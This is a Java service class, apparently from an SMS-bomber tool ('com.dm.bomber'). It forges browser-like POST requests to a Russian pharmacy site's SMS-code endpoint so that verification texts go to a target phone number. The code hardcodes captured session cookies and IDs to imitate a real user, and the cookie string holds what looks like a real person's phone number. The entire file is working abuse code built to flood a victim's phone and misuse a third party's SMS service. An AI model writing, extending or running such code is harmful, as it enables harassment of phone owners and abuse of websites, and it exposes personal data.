package com.dm.bomber.services;

import okhttp3.FormBody;
import okhttp3.Request;

public class Zdravcity extends FormService {

    public Zdravcity() {
        setUrl("https://zdravcity.ru/ajax/sendcode.php");
        setMethod(POST);
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("Accept", "application/json, text/javascript, */*; q=0.01");
        builder.addHeader("Accept-Encoding", "gzip, deflate, br");
        builder.addHeader("Accept-Language", "ru,en-US;q=0.7,en;q=0.3");
        builder.addHeader("Alt-Used", "zdravcity.ru");
        builder.addHeader("Connection", "keep-alive");
        builder.addHeader("Content-Length", "81");
        builder.addHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        builder.addHeader("Cookie", "PHPSESSID=36ompis7t70h760q1m53mrsab1; BITRIX_SM_ABTEST_s1=1%7CB; BITRIX_SM_LAST_REG_CODE=Moscowregion; BITRIX_SM_OLD_FAVORITES_CHECKED=Y; experiment-redesign=controlExperiment; newcart=false; _gaexp=GAX1.2.JKngMcRcSguFtw8O60tICA.18879.1; BX_USER_ID=868804f78bbb85b7fa136d704deb9c7a; _gcl_au=1.1.88904125.1628343659; _ym_uid=16283436611033418; _ym_d=1628343661; rrpvid=168462839558745; _userGUID=0:ks1trupz:cFyDarCG1VPnM_JbO9LekJg1RPA~ibdU; _ga=GA1.2.1318070326.1628343662; _gid=GA1.2.2090191083.1628343662; _ym_isad=1; tmr_reqNum=12; tmr_lvid=470e4de3fbd93e142890039d69401a27; tmr_lvidTS=1628343662067; HIDE_DESCRIPTION_HEADER_BANNER=Y; tmr_detect=1%7C1628343662427; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; dSesn=2efab3e0-eacf-653c-0262-355a98d221cb; _dvs=0:ks1trupz:wqmyHYmwOr~Ty6cj8VfXUqkcCL_Cc4K7; rcuid=60fa5e5b83344a0001456ccb; _ym_visorc=w; mindboxDeviceUUID=b7b572e4-0c88-4c08-bd87-ce7b37989f85; directCrm-session=%7B%22deviceGuid%22%3A%22b7b572e4-0c88-4c08-bd87-ce7b37989f85%22%7D; _gat_UA-60065697-1=1; flocktory-uuid=0540ae8f-b10e-4ba2-8554-0038c20fb7c2-5; _fbp=fb.1.1628343665796.1565400631; cto_bundle=RNGZlV9JV1Zsc3R3aXdFclk4c1hqUklpNGdvdkc3VTVybVZMRTVFJTJCTGkwSFNkRU0zY20lMkZSOGhPM05Bd20ybHBxNmhZMGlhM3ZXQmdkYjJveXNJY0luJTJCZVdBN0xKVW11MWpaQndYeEZOJTJCJTJCQUsydXM4UDFLeDdqcU4yM3VRbkolMkZ0TVpnUnFkdGNuUUJvMnFsSnRyYVRycUlKdVElM0QlM0Q; _dc_gtm_UA-60065697-1=1; lastRegData=sessid%3D3b1b4a8041b130671a05ee72e48b5ba9%26enter_back_url%3D%26save%3DY%26send_message_drug_id%3D%26buyer_phone%3D%28904%29595-01-05%26tmpphone%3D9045950105%26sms_cod%3D%26buyer_name%3D%26buyer_surname%3D%26buyer_email%3D%26my_health_cart%3DY%26register_buyer%3DY; d7a7fd7sa6=-1; _gali=login-new-registration");
        builder.addHeader("Host", "zdravcity.ru");
        builder.addHeader("Origin", "https://zdravcity.ru");
        builder.addHeader("Referer", "https://zdravcity.ru/");
        builder.addHeader("Sec-Fetch-Dest", "empty");
        builder.addHeader("Sec-Fetch-Mode", "cors");
        builder.addHeader("Sec-Fetch-Site", "same-origin");
        builder.addHeader("TE", "trailers");
        builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0");
        builder.addHeader("X-Requested-With", "XMLHttpRequest");

        return super.buildRequest(builder);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("phone", phone);
        builder.add("bxsid", "3b1b4a8041b130671a05ee72e48b5ba9");
        builder.add("sms1", "Y");
        builder.add("typeAction", "regUser");
    }
}
